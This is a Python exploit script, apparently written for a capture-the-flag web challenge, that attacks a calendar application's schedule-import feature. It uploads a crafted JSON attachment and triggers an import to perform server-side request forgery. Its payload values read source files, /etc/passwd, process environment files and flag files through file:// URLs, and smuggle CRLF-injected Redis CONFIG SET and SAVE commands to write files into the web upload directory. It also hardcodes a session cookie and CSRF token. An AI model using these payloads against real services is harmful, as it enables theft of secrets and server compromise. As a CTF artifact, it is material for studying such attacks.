import requests
from json import loads, dumps

cookies = {
    'session': 'd6f02b38-b7dc-47c2-a06b-7e87e8f144ff',
}

headers = {
    'Origin': 'http://110.10.147.124',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
    # 'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Referer': 'http://110.10.147.124/',
    'Connection': 'keep-alive',
    'x-csrf-token': 'ImE4YWNjOWNjOWQzMzY3YzQ2OWEwYTdmZjk1YjdhZWNiZmQwNWIwNzgi.XJq9HQ.i_WeyHdYgoRcAvT20GCoHGo_UCI',
}

# data = '$------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="calendar"\\r\\n\\r\\n620\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="title"\\r\\n\\r\\nMake your first schedule!\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="start"\\r\\n\\r\\n2019-03-26T09:00\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="end"\\r\\n\\r\\n\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="all_day"\\r\\n\\r\\n1\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="external_url"\\r\\n\\r\\n\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="memo"\\r\\n\\r\\nIf you want to share your schedules, write that in your public calendar and share it!\\r\\nYou can write an additional information at here\\r\\n\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="attachment"; filename=""\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="schedule"\\r\\n\\r\\n617\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH\\r\\nContent-Disposition: form-data; name="csrf_token"\\r\\n\\r\\ImE4YWNjOWNjOWQzMzY3YzQ2OWEwYTdmZjk1YjdhZWNiZmQwNWIwNzgi.XJqhQQ.AfTTPwl1OL-U2_5tZZAabddIIsM\\r\\n------WebKitFormBoundarym0ojnxZ4wTc1uGwH--\\r\\n'

# {"name": "???", "schedules": [{"all_day":true,"attachment":null,"calendar":{"id":619,"type":"public"},"end":"2019-01-26T10:00:00+00:00","external_url":"","id":659,"imported_from":null,"memo":"asdf","start":"2019-01-26T09:00:00+00:00","title":"XMXMXKMXKMXKX"}]}
# {"name": "???", "schedules": [{"all_day":true,"attachment":"file:///proc/self/cwd/config/__init__.py","calendar":{"id":620,"type":"private"},"end":"2019-04-26T10:00:00+00:00","external_url":"http://adm1nkyj.kr/123123","id":659,"imported_from":null,"memo":"fdsafas","start":"2019-01-26T09:00:00+00:00","title":"fdsafdsa"}]}


fn = 'file:///proc/self/cwd/app/controller/blueprint.py'
fn = 'file:///proc/self/cwd/app/controller/account.py'
fn = 'file:///home/shage/shage/dist/static/upload/8c8adb20ce364cd99515c4aaffd637f3/environ'

# http://110.10.147.124/static/upload/8c8adb20ce364cd99515c4aaffd637f3/asdf
# /home/shage/shage/dist/static/upload/8c8adb20ce364cd99515c4aaffd637f3/x
fn = 'http://redis:6379/%0d%0aCONFIG SET dir \'/home/shage/shage/dist/static/upload/8c8adb20ce364cd99515c4aaffd637f3\'%0d%0aCONFIG SET dbfilename \'asdf\' %0d%0aSAVE \\r\\n'
# fn = 'http://localhost:8080/s'

# fn = 'localfile:/etc/passwd'
# fn = 'file:///proc/self/cwd/db/base.py'
# fn = 'file:///proc/1/environ'
# fn = 'file:///proc/1/cmdline'
# fn = 'file:///home/shage/shage/manage.py'
# fn = 'file:///etc/hosts'



# fn = 'file:///home/shage/shage/flag.py'
# fn = 'file:///srv/flag'
# fn = 'http://127.0.0.1:6379'
# fn = 'file:///proc/self/cwd/utils/flask.py'
# fn = 'file:///etc/issue'


pay = '''
{"name": "???", "schedules": [{"all_day":true,"attachment":"%s","calendar":{"id":606,"type":"private"},"end":"2019-04-26T10:00:00+00:00","external_url":"http://adm1nkyj.kr/123123","id":659,"imported_from":null,"memo":"fdsafas","start":"2019-01-26T09:00:00+00:00","title":"fdsafdsa"}]}

'''.strip() % fn
data = {
	'calendar': '606',
	'title': 'junoim1234Make your first schedule!',
	'start': '2019-03-26T09:00',
	'end': '2019-03-26T09:00',
	'all_day': '1',
	'external_url': '',
	'memo': 'xaasfdIf you want to share your schedules, write that in your public calendar and share it!',
	'attachment': '',
	'schedule': '609'
}

response = requests.put('http://110.10.147.124/schedules/609/', headers=headers, cookies=cookies, data=data, files={'attachment': ('xx.json', pay)})
print response.status_code
print response.content

res = loads(response.content)
attach = res['attachment']

full_attach  = 'http://110.10.147.124' + attach

print full_attach

print '-'*20
print requests.get(full_attach).content
print '-'*20

data = {
	'url': full_attach
}

response = requests.put('http://110.10.147.124/calendars/import', headers=headers, cookies=cookies, data=data)
print response.status_code
print response.content


